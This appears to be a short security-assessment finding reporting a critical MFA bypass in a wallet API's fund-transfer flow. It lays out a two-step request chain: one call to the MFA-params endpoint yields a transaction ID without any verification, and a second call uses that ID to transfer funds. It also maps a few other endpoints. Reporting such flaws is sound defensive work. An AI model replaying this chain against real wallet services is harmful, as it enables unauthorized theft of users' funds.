vulnerability: CRITICAL - MFA Bypass on Fund Transfers
impact: Complete bypass of MFA verification for wallet transfers. No captcha, no passkey, no verification needed.

proof.analysis: verify_items is EMPTY - no captcha/passkey/MFA required. Transfer only failed due to insufficient balance, NOT authentication.

exploit_chain: POST /wallet-api/v1/generate_mfa_params with usage=transfer → gets txn_id with NO verification
POST /wallet-api/v1/transfer with txn_id → transfers funds (only needs balance)

additional_endpoints_mapped./account/pubkey: Returns RSA public key for encryption (key_id: v0)
additional_endpoints_mapped./wallet-api/v1/get_whitelist_address: Returns whitelist (200 OK, no auth needed beyond token)
